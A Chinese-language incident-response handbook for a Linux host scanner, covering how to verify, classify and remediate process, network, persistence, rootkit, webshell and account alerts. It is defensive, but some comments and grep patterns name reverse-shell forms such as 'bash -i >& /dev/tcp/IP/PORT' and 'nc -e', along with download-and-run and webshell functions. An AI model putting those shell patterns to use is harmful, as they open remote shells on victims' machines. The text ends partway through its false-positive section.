# 安全告警解读与处置指南

sec-userspace 扫描告警的解释、验证、判定与修复手册。面向安全运维人员，覆盖所有告警类型。

---

## Table of Contents | 目录

- [1. 告警优先级说明](#1-告警优先级说明)
- [2. 进程异常类告警](#2-进程异常类告警)
  - [2.1 已删除二进制运行进程](#21-已删除二进制运行进程deleted-binary-running-process)
  - [2.2 异常进程路径](#22-异常进程路径suspicious-process-path)
  - [2.3 孤儿进程检测](#23-孤儿进程检测orphan-process)
  - [2.4 隐藏进程](#24-隐藏进程hidden-process)
- [3. 网络异常类告警](#3-网络异常类告警)
  - [3.1 反弹 Shell 检测](#31-反弹-shell-检测reverse-shell)
  - [3.2 异常出站连接](#32-异常出站连接abnormal-outbound-connection)
  - [3.3 DNS 隧道嫌疑](#33-dns-隧道嫌疑dns-tunneling)
  - [3.4 非标准端口使用](#34-非标准端口使用non-standard-port-usage)
- [4. 认证与凭据类告警](#4-认证与凭据类告警)
  - [4.1 暴力破解检测](#41-暴力破解检测brute-force)
  - [4.2 异常 root 登录](#42-异常-root-登录)
  - [4.3 凭据文件泄露](#43-凭据文件泄露credential-exposure)
  - [4.4 异常 sudo 使用](#44-异常-sudo-使用)
- [5. 持久化类告警](#5-持久化类告警)
  - [5.1 异常 Crontab 条目](#51-异常-crontab-条目suspicious-cron-entry)
  - [5.2 可疑 Systemd Timer/Service](#52-可疑-systemd-timerservice)
  - [5.3 Shell 配置注入](#53-shell-配置注入bashrcprofile-injection)
  - [5.4 SSH Authorized_Keys 异常](#54-ssh-authorized_keys-异常)
- [6. 恶意软件类告警](#6-恶意软件类告警)
  - [6.1 Rootkit 检测](#61-rootkit-检测)
  - [6.2 Webshell 检测](#62-webshell-检测)
  - [6.3 挖矿程序检测](#63-挖矿程序检测cryptomining)
  - [6.4 后门检测](#64-后门检测backdoor)
- [7. 文件系统类告警](#7-文件系统类告警)
  - [7.1 SUID/SGID 异常文件](#71-suidsgid-异常文件)
  - [7.2 敏感目录可写文件与异常权限](#72-敏感目录可写文件与异常权限)
  - [7.3 可疑隐藏文件](#73-可疑隐藏文件)
- [8. 用户与权限类告警](#8-用户与权限类告警)
  - [8.1 UID 0 的非 root 用户](#81-uid-0-的非-root-用户)
  - [8.2 无密码用户](#82-无密码用户)
  - [8.3 最近创建的可疑用户](#83-最近创建的可疑用户)
- [9. 日志与审计类告警](#9-日志与审计类告警)
  - [9.1 日志被清除/篡改](#91-日志被清除篡改)
  - [9.2 审计配置缺失](#92-审计配置缺失)
  - [9.3 关键日志空白时段](#93-关键日志空白时段)
- [10. 常见误报速查表](#10-常见误报速查表)
- [11. 应急响应清单](#11-应急响应清单)
- [12. 参考资源](#12-参考资源)

---

## 1. 告警优先级说明

### 严重级别

| 级别 | 标识 | 含义 | 响应时限 |
|------|------|------|----------|
| **P0 / Critical** | 🔴 | 确认入侵，需立即响应 | 15 分钟内 |
| **P1 / High** | 🟠 | 高度可疑，需紧急调查 | 1 小时内 |
| **P2 / Medium** | 🟡 | 安全隐患，需计划修复 | 24 小时内 |
| **P3 / Low** | 🔵 | 信息提示，建议优化 | 下次维护窗口 |

### 结论类型

| 结论 | 含义 | 后续动作 |
|------|------|----------|
| **Compromised（已入侵）** | 发现明确恶意行为证据（如反弹 Shell、Rootkit） | 立即启动应急响应流程 |
| **Suspicious（可疑）** | 发现异常但无法确认入侵（如异常进程路径） | 深入调查，收集更多证据 |
| **At Risk（存在风险）** | 存在安全配置缺陷（如 SUID 滥用） | 计划修复，纳入加固清单 |

---

## 2. 进程异常类告警

### 2.1 已删除二进制运行进程（Deleted Binary Running Process）

**告警含义**：进程对应的可执行文件已从磁盘删除但仍在内存中运行。攻击者常在投放恶意程序后删除文件以逃避检测。

**验证步骤**：

```bash
# Step 1: 查看告警进程的可执行文件链接
ls -la /proc/<pid>/exe

# Step 2: 查看进程命令行和启动时间
cat /proc/<pid>/cmdline | tr '\0' ' '
ps -p <pid> -o pid,ppid,user,lstart,cmd

# Step 3: 查看进程打开的文件和网络连接
ls -la /proc/<pid>/fd/
cat /proc/<pid>/net/tcp

# Step 4: 导出进程内存中的二进制（取证用）
cp /proc/<pid>/exe /tmp/recovered_binary_<pid>
sha256sum /tmp/recovered_binary_<pid>
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| 二进制来自 /tmp、/dev/shm 且有网络连接 | Compromised | 立即 kill 并取证 |
| 二进制为已知软件但被意外删除（如 yum update 中途） | 误报 | 重装对应软件包 |
| 容器内进程、overlay 文件系统导致 | 误报 | 加入白名单 |

**常见误报**：

| 环境 | 误报场景 | 验证方法 | 处置 |
|------|----------|----------|------|
| 软件更新 | yum/apt 更新过程中旧二进制被替换 | `rpm -V <package>` 或 `dpkg -V <package>` | 等待更新完成后重扫 |
| 容器 | overlay 文件系统显示 (deleted) | `cat /proc/<pid>/mountinfo \| grep overlay` | 加入容器白名单 |
| tmpfiles | systemd-tmpfiles 清理临时文件 | `systemctl status systemd-tmpfiles-clean` | 忽略 |

**修复命令**：

```bash
# 确认为恶意后：
kill -9 <pid>
# 检查是否有持久化机制
grep -r "<binary_name>" /etc/cron* /etc/systemd/system/ /etc/init.d/
```

### 2.2 异常进程路径（Suspicious Process Path）

**告警含义**：从 `/tmp`、`/dev/shm`、`/var/tmp` 等临时目录运行的进程。正常服务不应从临时目录启动，攻击者常将恶意程序放在这些可写目录。

**验证步骤**：

```bash
# Step 1: 确认进程可执行文件路径
readlink -f /proc/<pid>/exe

# Step 2: 检查文件属性
file /proc/<pid>/exe
stat $(readlink -f /proc/<pid>/exe 2>/dev/null)

# Step 3: 查看进程树，确认父进程
pstree -p <pid>
ps -p <pid> -o pid,ppid,user,cmd

# Step 4: 检查是否有网络连接
ss -tnp | grep "pid=<pid>"
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| /dev/shm 下的 ELF 文件，有出站连接 | Compromised | kill + 取证 + 排查入口 |
| /tmp 下的安装脚本（如 pip、npm 构建） | 误报 | 确认后忽略 |
| /tmp 下的编译中间产物 | 误报 | 确认后忽略 |

**常见误报**：

| 环境 | 误报场景 | 验证方法 | 处置 |
|------|----------|----------|------|
| 开发机 | pip/npm 在 /tmp 编译安装包 | `ps -p <ppid> -o cmd` 确认父进程为 pip/npm | 忽略 |
| 运维 | ansible/salt 远程执行脚本放在 /tmp | 检查父进程是否为 sshd→python | 忽略或改用标准路径 |
| CI/CD | Jenkins agent 在 /tmp 运行构建 | 确认进程属于 CI 用户 | 加入白名单 |

### 2.3 孤儿进程检测（Orphan Process）

**告警含义**：父进程为 init/systemd（PPID=1）但非守护进程的用户态进程。可能是攻击者进程的父进程被清理后遗留。

**验证步骤**：

```bash
# Step 1: 确认进程的父进程
ps -p <pid> -o pid,ppid,user,etime,cmd

# Step 2: 查看是否为已知守护进程
systemctl list-units --type=service --state=running | grep <process_name>

# Step 3: 检查进程活动
strace -p <pid> -c -t 2>&1 | head -20   # 仅在可接受性能影响时使用
ls -la /proc/<pid>/fd/ | wc -l
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| 未知二进制、PPID=1、有网络连接 | Suspicious | 深入调查 |
| 已知服务的 worker 进程 | 误报 | 忽略 |
| 用户退出终端后遗留的 nohup 进程 | 正常 | 确认后忽略 |

### 2.4 隐藏进程（Hidden Process）

**告警含义**：通过对比 `ps` 输出与 `/proc` 目录发现不一致，存在对用户空间工具隐藏的进程。这是 Rootkit 的强特征。

**验证步骤**：

```bash
# Step 1: 对比 ps 与 /proc
diff <(ps -eo pid --no-headers | sort -n) \
     <(ls /proc | grep -E '^[0-9]+$' | sort -n)

# Step 2: 检查可疑 PID 的详情
cat /proc/<hidden_pid>/cmdline | tr '\0' ' '
cat /proc/<hidden_pid>/status

# Step 3: 检查内核模块（Rootkit 可能加载了内核模块）
lsmod | grep -v -E "^(Module|ip|nf_|xt_|x_tables|tcp|udp)"
cat /proc/modules | awk '{print $1}' | sort
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| /proc 中存在但 ps 不显示 | Compromised（高度疑似 Rootkit） | 立即隔离主机 |
| 短生命周期进程导致的竞态 | 误报 | 多次采样确认 |

---

## 3. 网络异常类告警

### 3.1 反弹 Shell 检测（Reverse Shell）

**告警含义**：检测到进程将标准输入/输出重定向到网络套接字，这是反弹 Shell 的典型特征，几乎 100% 为恶意行为。

**验证步骤**：

```bash
# Step 1: 查看告警进程的文件描述符
ls -la /proc/<pid>/fd/
# 如果 fd/0、fd/1、fd/2 指向 socket，则确认为反弹 Shell

# Step 2: 查看网络连接目标
ss -tnp | grep "pid=<pid>"
cat /proc/<pid>/net/tcp

# Step 3: 查看进程命令行
cat /proc/<pid>/cmdline | tr '\0' ' '
# 常见模式：bash -i >& /dev/tcp/IP/PORT, python -c 'import socket...', nc -e

# Step 4: 追溯父进程链
pstree -p <pid>
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| stdin/stdout 指向远程 socket | Compromised | 立即 kill、隔离、取证 |
| 运维人员的合法远程管理工具 | 误报 | 确认后加白名单 |

**常见误报**：

| 环境 | 误报场景 | 验证方法 | 处置 |
|------|----------|----------|------|
| 运维 | 合法的远程管理工具（如 Teleport） | 确认连接目标为内部管理平台 IP | 加入白名单 |
| 开发 | SSH 隧道 + 端口转发 | `ss -tnp` 确认为 sshd 子进程 | 忽略 |

**修复命令**：

```bash
# 立即处置
kill -9 <pid>
# 封锁 C2 地址
iptables -A OUTPUT -d <c2_ip> -j DROP
# 排查入口点
grep "Accepted" /var/log/auth.log | tail -20
last -i | head -20
```

### 3.2 异常出站连接（Abnormal Outbound Connection）

**告警含义**：系统进程或守护进程发起了非预期的出站网络连接，可能为恶意软件的 C2 通信或数据外泄。

**验证步骤**：

```bash
# Step 1: 查看所有出站连接
ss -tnp | grep ESTAB | awk '{print $5, $6}'

# Step 2: 查询目标 IP 信誉
# 使用威胁情报平台查询：VirusTotal、AbuseIPDB、微步在线
whois <dest_ip> | grep -i "org\|country\|netname"

# Step 3: 确认发起连接的进程
ss -tnp | grep "<dest_ip>"
cat /proc/<pid>/cmdline | tr '\0' ' '

# Step 4: 检查 DNS 解析记录（如有）
grep "<dest_ip>" /var/log/syslog
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| 目标 IP 在威胁情报黑名单中 | Compromised | 立即阻断 + 取证 |
| 系统守护进程连接未知外网 IP | Suspicious | 深入调查 |
| 正常软件更新（apt/yum 仓库） | 误报 | 忽略 |

### 3.3 DNS 隧道嫌疑（DNS Tunneling）

**告警含义**：检测到异常 DNS 查询模式（超长子域名、高频 TXT 记录查询），可能通过 DNS 协议进行隐蔽数据传输。

**验证步骤**：

```bash
# Step 1: 检查 DNS 查询日志
grep -i "query" /var/log/syslog | tail -50
# 关注：子域名长度 > 50 字符、大量 TXT 查询

# Step 2: 抓包确认
tcpdump -i any -n port 53 -c 100 -w /tmp/dns_capture.pcap
tcpdump -r /tmp/dns_capture.pcap -n | grep -i "TXT\|长域名"

# Step 3: 统计 DNS 查询频率
tcpdump -i any -n port 53 -c 1000 2>/dev/null | \
  awk '{print $NF}' | sort | uniq -c | sort -rn | head -20
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| 高频 TXT 查询 + 高熵子域名 + 未知域名 | Compromised | 阻断 DNS 目标域名 |
| CDN、DNSBL 等合法高频查询 | 误报 | 忽略 |

### 3.4 非标准端口使用（Non-standard Port Usage）

**告警含义**：检测到服务运行在非标准端口上（如 SSH 运行在 2222、HTTP 运行在 8443），可能是攻击者为规避检测而使用的隐蔽通信端口。

**验证步骤**：

```bash
# Step 1: 列出所有监听端口
ss -tlnp

# Step 2: 对比预期服务端口基线
# 确认每个非标准端口的服务是否为已知配置

# Step 3: 查看非标准端口的流量
ss -tnp | grep ":<port>" | head -20
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| 未知进程监听高端口，有外部连接 | Suspicious | 深入调查进程来源 |
| 运维配置的非标准端口（如 SSH 改端口） | 正常 | 加入白名单 |
| 开发环境的调试端口 | At Risk | 生产环境应关闭 |

---

## 4. 认证与凭据类告警

### 4.1 暴力破解检测（Brute Force）

**告警含义**：短时间内出现大量认证失败记录，表明正在遭受暴力破解攻击。如果之后出现成功登录，账户可能已被攻破。

**验证步骤**：

```bash
# Step 1: 统计失败登录次数和来源 IP
grep "Failed password" /var/log/auth.log | \
  awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -20

# Step 2: 检查是否有后续成功登录
grep "Accepted" /var/log/auth.log | tail -20

# Step 3: 检查来源 IP 的地理位置
whois <source_ip> | grep -i "country\|org"

# Step 4: 检查失败后是否创建了新用户
grep -E "useradd|adduser|new user" /var/log/auth.log
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| 大量失败后紧跟成功登录 | Compromised | 立即锁定账户 + 排查 |
| 仅失败无成功，来自外网 IP | At Risk | 封锁来源 IP + 加固 |
| 内部运维工具频繁重试 | 误报 | 修复工具配置 |

**修复命令**：

```bash
# 封锁攻击源 IP
iptables -A INPUT -s <attacker_ip> -j DROP

# 锁定被攻击账户
passwd -l <username>

# 安装 fail2ban 防护
# 检查 sshd 配置
grep -E "MaxAuthTries|PermitRootLogin" /etc/ssh/sshd_config
```

### 4.2 异常 root 登录

**告警含义**：检测到 root 用户直接登录（非 sudo 提权），尤其是从远程 IP 登录，违反最小权限原则。

**验证步骤**：

```bash
# Step 1: 查看 root 登录记录
grep "session opened.*root" /var/log/auth.log | tail -20
last root | head -10

# Step 2: 确认登录来源
grep "Accepted.*root" /var/log/auth.log | tail -10

# Step 3: 检查 sshd 配置
grep "PermitRootLogin" /etc/ssh/sshd_config
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| root 从未知外网 IP 远程登录 | Compromised | 立即排查 + 改密 |
| root 从内网管理网段登录 | At Risk | 改为 sudo 方式 |
| 控制台（tty1）本地登录 | 正常 | 记录审计 |

### 4.3 凭据文件泄露（Credential Exposure）

**告警含义**：在文件系统中发现明文密码、SSH 私钥暴露、API Key 硬编码等凭据泄露风险。

**验证步骤**：

```bash
# Step 1: 查看告警指向的文件内容
cat <file_path> | head -20

# Step 2: 检查文件权限
stat <file_path>
ls -la <file_path>

# Step 3: 确认是否为真实凭据（非示例/模板）
grep -i "example\|sample\|template\|placeholder\|xxx\|changeme" <file_path>

# Step 4: 检查 SSH 私钥权限
find /home -name "id_rsa" -o -name "id_ed25519" | xargs ls -la 2>/dev/null
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| 明文真实密码 + 权限过宽(644/777) | At Risk（高危） | 立即修复权限 + 轮换密码 |
| 示例配置文件中的占位符 | 误报 | 忽略 |
| 私钥权限 600 + 仅属主可读 | 正常 | 忽略 |

### 4.4 异常 sudo 使用

**告警含义**：检测到非预期的 sudo 调用模式，包括 NOPASSWD 配置、sudo 提权到非 root 用户、异常命令。

**验证步骤**：

```bash
# Step 1: 查看 sudo 日志
grep "sudo:" /var/log/auth.log | tail -30

# Step 2: 检查 sudoers 配置
cat /etc/sudoers
ls -la /etc/sudoers.d/
cat /etc/sudoers.d/* 2>/dev/null

# Step 3: 查找 NOPASSWD 配置
grep -r "NOPASSWD" /etc/sudoers /etc/sudoers.d/ 2>/dev/null
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| 普通用户 sudo 执行了 /bin/bash 或 /bin/sh | Suspicious | 排查该用户活动 |
| NOPASSWD 配置过于宽泛（ALL=(ALL) NOPASSWD:ALL） | At Risk | 收紧 sudo 权限 |
| 自动化运维账户的 NOPASSWD | 正常 | 确认后忽略 |

---

## 5. 持久化类告警

### 5.1 异常 Crontab 条目（Suspicious Cron Entry）

**告警含义**：发现可疑的定时任务，包含下载执行、Base64 编码命令、指向临时目录的脚本等恶意持久化特征。

**验证步骤**：

```bash
# Step 1: 列出所有用户的 crontab
for user in $(cut -f1 -d: /etc/passwd); do
  echo "=== $user ==="; crontab -u "$user" -l 2>/dev/null
done

# Step 2: 检查系统级 cron
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
cat /etc/cron.d/* 2>/dev/null

# Step 3: 检查告警条目指向的脚本内容
cat <script_path>
file <script_path>

# Step 4: 如果是 Base64 编码命令，解码查看
echo "<base64_string>" | base64 -d
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| curl/wget 下载 + 管道执行 | Compromised | 立即删除 + 取证 |
| Base64 编码的命令 | Compromised | 解码审查 + 删除 |
| 指向 /tmp 的脚本 | Suspicious | 审查脚本内容 |
| 系统自带的日志轮转/清理任务 | 误报 | 忽略 |

**修复命令**：

```bash
# 删除恶意 crontab
crontab -u <user> -r    # 删除整个 crontab（慎用）
crontab -u <user> -e    # 编辑删除特定条目

# 删除系统级恶意 cron
rm /etc/cron.d/<malicious_file>
```

### 5.2 可疑 Systemd Timer/Service

**告警含义**：发现非标准路径或近期创建的 systemd 服务/定时器，可能为攻击者创建的持久化后门。

**验证步骤**：

```bash
# Step 1: 列出近期创建的 service 文件
find /etc/systemd/system /usr/lib/systemd/system -name "*.service" -mtime -7
find /etc/systemd/system -name "*.timer" -mtime -7

# Step 2: 查看可疑 service 内容
systemctl cat <service_name>

# Step 3: 检查 service 是否由包管理器安装
dpkg -S <service_file_path> 2>/dev/null || rpm -qf <service_file_path> 2>/dev/null

# Step 4: 查看 service 运行状态
systemctl status <service_name>
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| ExecStart 指向 /tmp 或 /dev/shm | Compromised | 停止 + 删除 + 取证 |
| 非包管理器安装 + 执行网络命令 | Suspicious | 深入审查 |
| 运维部署的合法服务 | 正常 | 记录备案 |

### 5.3 Shell 配置注入（.bashrc/.profile Injection）

**告警含义**：用户的 Shell 配置文件被注入恶意命令，每次用户登录时自动执行。

**验证步骤**：

```bash
# Step 1: 检查所有用户的 shell 配置
for user_home in /home/* /root; do
  echo "=== $user_home ==="
  tail -5 "$user_home/.bashrc" "$user_home/.bash_profile" "$user_home/.profile" 2>/dev/null
done

# Step 2: 对比与默认配置的差异
diff /etc/skel/.bashrc /home/<user>/.bashrc

# Step 3: 查找可疑模式
grep -n -E "curl|wget|base64|/dev/tcp|eval|python.*-c" /home/*/.bashrc /root/.bashrc 2>/dev/null
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| 包含下载执行、反弹 Shell 代码 | Compromised | 清除恶意行 + 取证 |
| 包含环境变量 LD_PRELOAD 设置 | Compromised | 清除 + 检查对应 so 文件 |
| 用户自行添加的开发工具路径 | 误报 | 忽略 |

### 5.4 SSH Authorized_Keys 异常

**告警含义**：检测到未授权的 SSH 公钥或带 command= 选项的密钥条目，可能为攻击者植入的后门访问凭据。

**验证步骤**：

```bash
# Step 1: 列出所有 authorized_keys
find / -name "authorized_keys" -exec echo "--- {} ---" \; -exec cat {} \; 2>/dev/null

# Step 2: 检查密钥指纹
ssh-keygen -lf /home/<user>/.ssh/authorized_keys

# Step 3: 查找带 command= 的条目
grep "command=" /home/*/.ssh/authorized_keys /root/.ssh/authorized_keys 2>/dev/null

# Step 4: 检查文件修改时间
stat /home/<user>/.ssh/authorized_keys
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| 未知公钥 + 带 command= 执行恶意命令 | Compromised | 删除密钥 + 排查来源 |
| 未经审批的公钥 | At Risk | 与用户确认后处置 |
| 运维自动化的部署密钥 | 正常 | 记录备案 |

---

## 6. 恶意软件类告警

### 6.1 Rootkit 检测

**告警含义**：检测到 Rootkit 相关特征，包括可疑内核模块、LD_PRELOAD 劫持、隐藏文件等。Rootkit 可以从内核层面隐藏攻击者活动。

**验证步骤**：

```bash
# Step 1: 检查 LD_PRELOAD
cat /etc/ld.so.preload 2>/dev/null
env | grep LD_PRELOAD
grep -r LD_PRELOAD /proc/*/environ 2>/dev/null | head -10

# Step 2: 检查内核模块
lsmod
# 对比已知模块列表，关注非发行版标准模块
dpkg -S $(lsmod | awk 'NR>1{print $1".ko"}') 2>/dev/null

# Step 3: 检查隐藏文件
find / -name ".*" -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | head -50

# Step 4: 检查 /proc 异常
ls -la /proc/*/exe 2>/dev/null | grep -v -E "(bash|python|sshd|systemd|cron)"
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| /etc/ld.so.preload 存在非空内容 | Compromised | 立即隔离主机 |
| 未知内核模块 + 进程隐藏 | Compromised | 立即隔离 + 取证 |
| 系统安全模块（AppArmor/SELinux）的 .ko | 正常 | 忽略 |

**修复命令**：

```bash
# 清除 LD_PRELOAD 劫持
cat /dev/null > /etc/ld.so.preload
# 卸载可疑内核模块
rmmod <module_name>
# 严重情况建议从可信镜像重装系统
```

### 6.2 Webshell 检测

**告警含义**：在 Web 目录中检测到包含命令执行、文件操作等后门特征的脚本文件（PHP/JSP/ASP）。

**验证步骤**：

```bash
# Step 1: 查看告警文件内容
cat <webshell_file>

# Step 2: 检查文件创建时间和属主
stat <webshell_file>
ls -la <webshell_file>

# Step 3: 在 Web 目录搜索类似文件
find /var/www -name "*.php" -newer /etc/os-release -exec ls -la {} \;
grep -rl "eval\|base64_decode\|system\|passthru\|exec\|shell_exec" /var/www/ 2>/dev/null

# Step 4: 检查 Web 服务器访问日志
grep "<webshell_filename>" /var/log/nginx/access.log /var/log/apache2/access.log 2>/dev/null
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| 包含 eval($_POST[...])、system() 等 | Compromised | 删除 + 排查漏洞入口 |
| 非版本控制的陌生 PHP 文件 | Suspicious | 审查内容 |
| CMS 框架自带的管理文件 | 误报 | 确认后忽略 |

### 6.3 挖矿程序检测（Cryptomining）

**告警含义**：检测到加密货币挖矿程序特征，包括高 CPU 占用、挖矿池连接、已知挖矿程序文件名/哈希。

**验证步骤**：

```bash
# Step 1: 查看高 CPU 进程
ps aux --sort=-%cpu | head -10

# Step 2: 检查进程是否连接矿池
ss -tnp | grep "<pid>"
# 常见矿池端口: 3333, 4444, 5555, 7777, 8888, 14444, 14433

# Step 3: 检查进程命令行中的矿池/钱包地址
cat /proc/<pid>/cmdline | tr '\0' ' '
strings /proc/<pid>/exe | grep -i "stratum\|pool\|wallet\|xmr\|monero"

# Step 4: 检查文件哈希
sha256sum /proc/<pid>/exe
# 去 VirusTotal 查询哈希值
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| 连接矿池 + 包含钱包地址 | Compromised | kill + 清除 + 排查入口 |
| 高 CPU 但为合法计算任务 | 误报 | 确认后忽略 |

**修复命令**：

```bash
kill -9 <pid>
rm -f <miner_binary_path>
# 排查持久化
grep -r "<miner_name>" /etc/cron* /etc/systemd/ /home/*/.bashrc
# 排查入口（常见：Redis 未授权、SSH 弱密码）
```

### 6.4 后门检测（Backdoor）

**告警含义**：检测到已知后门程序特征，如隐蔽监听端口、伪装系统进程名的可疑程序。

**验证步骤**：

```bash
# Step 1: 检查告警进程
ps -p <pid> -o pid,ppid,user,cmd
readlink -f /proc/<pid>/exe

# Step 2: 检查二进制是否被篡改
rpm -V $(rpm -qf <binary_path>) 2>/dev/null
dpkg -V $(dpkg -S <binary_path> 2>/dev/null | cut -d: -f1) 2>/dev/null

# Step 3: 检查隐蔽监听端口
ss -tlnp | awk '$4 !~ /:22$|:80$|:443$/'
```

---

## 7. 文件系统类告警

### 7.1 SUID/SGID 异常文件

**告警含义**：发现不在系统基线中的 SUID/SGID 文件。攻击者常通过设置 SUID 位来维持提权能力。

**验证步骤**：

```bash
# Step 1: 列出所有 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# Step 2: 确认是否由包管理器安装
dpkg -S <suid_file> 2>/dev/null || rpm -qf <suid_file> 2>/dev/null

# Step 3: 检查文件修改时间
stat <suid_file>

# Step 4: 对比已知安全 SUID 文件列表
# 常见合法 SUID: /usr/bin/passwd, /usr/bin/sudo, /usr/bin/ping, /usr/bin/su
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| 非包管理器安装 + 非标准路径 | Compromised | 移除 SUID 位 + 取证 |
| 已知 GTFOBins 中的可利用 SUID | At Risk | 评估是否需要 SUID |
| 系统默认 SUID 文件 | 正常 | 忽略 |

**修复命令**：

```bash
# 移除 SUID 位
chmod u-s <file_path>
# 或移除 SGID 位
chmod g-s <file_path>
```

### 7.2 敏感目录可写文件与异常权限

**告警含义**：在 `/etc`、`/usr/bin` 等系统关键目录发现全局可写文件，或重要配置文件权限过宽。

**验证步骤**：

```bash
# Step 1: 查看告警文件权限
ls -la <file_path>
stat <file_path>

# Step 2: 检查是否被篡改
rpm -V $(rpm -qf <file_path>) 2>/dev/null
sha256sum <file_path>

# Step 3: 查找全局可写的系统文件
find /etc /usr/bin /usr/sbin -perm -002 -type f 2>/dev/null
```

**修复命令**：

```bash
# 修复权限
chmod 644 /etc/<config_file>
chmod 755 /usr/bin/<binary>
chmod 600 /etc/shadow
chown root:root <file_path>
```

### 7.3 可疑隐藏文件

**告警含义**：在非预期位置发现隐藏文件（点开头），尤其在 Web 目录、/tmp 目录中，可能为攻击者存放的工具或数据。

**验证步骤**：

```bash
# Step 1: 查看告警文件
ls -la <hidden_file>
file <hidden_file>
cat <hidden_file> | head -20

# Step 2: 检查 Web 目录中的隐藏文件
find /var/www -name ".*" -type f 2>/dev/null

# Step 3: 检查 /tmp 中的隐藏目录
find /tmp /var/tmp /dev/shm -name ".*" 2>/dev/null
```

---

## 8. 用户与权限类告警

### 8.1 UID 0 的非 root 用户

**告警含义**：除 root 外存在 UID 为 0 的用户账户，该账户拥有与 root 完全相同的权限。这是攻击者创建后门超级用户的常见手法。

**验证步骤**：

```bash
# Step 1: 查找所有 UID 0 的用户
awk -F: '$3 == 0 {print $1}' /etc/passwd

# Step 2: 检查账户创建时间
grep <username> /var/log/auth.log | grep "new user"
chage -l <username>

# Step 3: 检查账户是否有登录记录
last <username>
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| 非 root 的 UID 0 账户 + 未经审批 | Compromised | 立即禁用 + 排查 |
| 历史遗留的管理账户（如 toor） | At Risk | 评估后决定是否保留 |

**修复命令**：

```bash
# 锁定账户
passwd -l <username>
usermod -s /usr/sbin/nologin <username>
# 或直接删除
userdel <username>
```

### 8.2 无密码用户

**告警含义**：/etc/shadow 中存在密码字段为空的用户，任何人可无密码登录该账户。

**验证步骤**：

```bash
# Step 1: 查找无密码用户
awk -F: '($2 == "" || $2 == "!") {print $1}' /etc/shadow

# Step 2: 检查账户是否有可登录 shell
grep <username> /etc/passwd | cut -d: -f7
```

**修复命令**：

```bash
# 设置密码或锁定
passwd <username>
# 或禁止登录
usermod -s /usr/sbin/nologin <username>
```

### 8.3 最近创建的可疑用户

**告警含义**：检测到近期新创建的用户账户，可能是攻击者创建的后门账户。

**验证步骤**：

```bash
# Step 1: 查看近期创建的用户
grep "useradd\|adduser\|new user" /var/log/auth.log | tail -20

# Step 2: 检查用户信息
id <username>
grep <username> /etc/passwd /etc/shadow /etc/group

# Step 3: 查看该用户的活动
last <username>
find / -user <username> -type f 2>/dev/null | head -20
```

---

## 9. 日志与审计类告警

### 9.1 日志被清除/篡改

**告警含义**：关键日志文件（auth.log、syslog、wtmp）被截断、删除或存在异常的大小变化。攻击者清除日志以掩盖入侵痕迹。

**验证步骤**：

```bash
# Step 1: 检查日志文件大小和修改时间
ls -la /var/log/auth.log* /var/log/syslog* /var/log/wtmp*
stat /var/log/auth.log

# Step 2: 检查日志是否被截断（文件小但主机已运行很久）
uptime
wc -l /var/log/auth.log

# Step 3: 检查 wtmp 记录完整性
last | tail -20
who /var/log/wtmp | wc -l

# Step 4: 检查审计日志
ls -la /var/log/audit/ 2>/dev/null
ausearch -m DELETE -ts recent 2>/dev/null
```

**判定标准**：

| 判定依据 | 结论 | 动作 |
|----------|------|------|
| 日志文件大小为 0 + 非刚轮转 | Compromised | 启动应急响应 |
| logrotate 刚执行完轮转 | 误报 | 检查 logrotate 配置确认 |
| 日志服务重启导致 | 正常 | 确认后忽略 |

### 9.2 审计配置缺失

**告警含义**：系统未启用 auditd 或审计规则配置不完整，无法有效记录安全事件。

**验证步骤**：

```bash
# Step 1: 检查 auditd 状态
systemctl status auditd

# Step 2: 查看审计规则
auditctl -l 2>/dev/null

# Step 3: 检查审计配置文件
cat /etc/audit/auditd.conf 2>/dev/null
ls /etc/audit/rules.d/ 2>/dev/null
```

**修复命令**：

```bash
# 启用 auditd
systemctl enable --now auditd
# 添加基本审计规则
auditctl -w /etc/passwd -p wa -k identity
auditctl -w /etc/shadow -p wa -k identity
auditctl -w /etc/sudoers -p wa -k sudoers
```

### 9.3 关键日志空白时段

**告警含义**：日志文件中存在不合理的时间空白——在预期有持续活动的时段没有任何日志记录。可能是攻击者选择性删除了特定时段的日志。

**验证步骤**：

```bash
# Step 1: 检查日志时间线
awk '{print $1, $2, $3}' /var/log/auth.log | head -5
awk '{print $1, $2, $3}' /var/log/auth.log | tail -5

# Step 2: 查找时间断层
awk '{print $1, $2, $3}' /var/log/syslog | uniq -c | sort -rn | head -10

# Step 3: 检查其他日志源是否有该时段记录
journalctl --since "YYYY-MM-DD HH:MM" --until "YYYY-MM-DD HH:MM" 2>/dev/null
```

---

## 10. 常见误报速查表

### 按环境类型

| 环境类型 | 常见误报 | 快速验证 | 处置 |
|----------|----------|----------|------|
| **开发机（WSL2）** | /tmp 进程、孤儿进程、非标准端口 | `uname -r \| grep microsoft` | 开发环境降低告警级别 |
